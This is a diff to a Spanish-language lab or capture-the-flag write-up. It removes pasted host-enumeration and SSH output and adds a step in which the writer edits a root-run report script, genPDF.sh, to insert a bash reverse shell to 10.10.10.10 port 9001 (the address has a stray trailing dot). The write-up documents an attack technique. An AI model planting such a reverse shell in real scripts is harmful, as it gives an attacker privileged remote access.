@@ -668,46 +668,48 @@ volvemos al host de galileo para enumerar el directorio `script` que vimos anter
 `genPDF.sh`
 ![[Pasted image 20240909144549.png]]
 
+`genPDF.sh`
+abrimos el script y lo editamos para agregar nuestra reverse shell
 ```python
-172.30.0.10 172.18.0.4 
-root@04fb17b23045:/tmp/Enum# ./HostPortEnumerator.sh -H 172.18.0.1-255
-[*] Host Enumeration, Waiting
- [✓]  172.18.0.1  Host active 
- [✓]  172.18.0.2  Host active 
- [✓]  172.18.0.3  Host active 
- [✓]  172.18.0.4  Host active 
-^C
+#!/bin/bash
 
- [*] Going out ...
- root@04fb17b23045:/tmp/Enum# ./HostPortEnumerator.sh -H 172.30.0.1-255
-[*] Host Enumeration, Waiting
- [✓]  172.30.0.1  Host active 
- [✓]  172.30.0.10  Host active 
- [✓]  172.30.0.12  Host active 
-^C
+bash -c 'bash -i &>/dev/tcp/10.10.10.10./9001 <&1'
 
- [*] Going out ...
- root@04fb17b23045:/tmp/Enum# ssh galileo@172.30.0.1
-The authenticity of host '172.30.0.1 (172.30.0.1)' can't be established.
-ECDSA key fingerprint is SHA256:MPYI6xCVFIXP4Dcf9OMIuTlwO0xCzr0xBGNoYUYagRw.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '172.30.0.1' (ECDSA) to the list of known hosts.
-galileo@172.30.0.1's password: 
-Permission denied, please try again.
-galileo@172.30.0.1's password: 
-Permission denied, please try again.
-galileo@172.30.0.1's password: 
-galileo@172.30.0.1: Permission denied (publickey,password).
-root@04fb17b23045:/tmp/Enum# ssh galileo@172.30.0.12
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
-Someone could be eavesdropping on you right now (man-in-the-middle attack)!
-It is also possible that a host key has just been changed.
-The fingerprint for the ECDSA key sent by the remote host is
-SHA256:7pobRSQbZIEy2/giMrZh1WESJziJYu0awbxh7O4axxU.
-  GNU nano 4.8                                                                               genPDF.sh                                                                                          
+output_file="/root/script/status_report.html"
+pdf_file="/root/reports/Status_report.pdf"
+
+if [ -f "$output_file" ]; then
+    /usr/bin/rm "$output_file"
+    echo "Deleted $output_file file."
+fi
+
+if [ -f "$pdf_file" ]; then
+    /usr/bin/rm "$pdf_file"
+    echo "Deleted $pdf_file file."
+fi
+
+cat <<EOF > $output_file
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Server Status Report</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif;
+            background-color: white;
+            color: black;
+        }
+        table { 
+            width: 100%; 
+            border-collapse: collapse; 
+            margin: 20px 0; 
+        }
+        th, td { 
+            border: 1px solid #ddd; 
+            padding: 8px; 
+            text-align: left; 
+            background-color: white;
         }
         th { 
             background-color: #007bff; 
@@ -741,7 +743,7 @@ SHA256:7pobRSQbZIEy2/giMrZh1WESJziJYu0awbxh7O4axxU.
 EOF
 
 for container in $(/usr/bin/docker ps --format "{{.ID}}"); do
-    /usr/bin/docker stats --no-stream --format "<tr><td>{{.ID}}</td><td>{{.Name}}</td><td>{{.CPUPerc}}</td><td>{{.MemUsage}}</td><td>{{.MemPerc}}</td><td>{{.NetIO}}</td><td>{{.BlockIO}}</td><>
+    /usr/bin/docker stats --no-stream --format "<tr><td>{{.ID}}</td><td>{{.Name}}</td><td>{{.CPUPerc}}</td><td>{{.MemUsage}}</td><td>{{.MemPerc}}</td><td>{{.NetIO}}</td><td>{{.BlockIO}}</td><td>{{.PIDs}}</td></tr>" $container >> $output_file
 done
 
 cat <<EOF >> $output_file
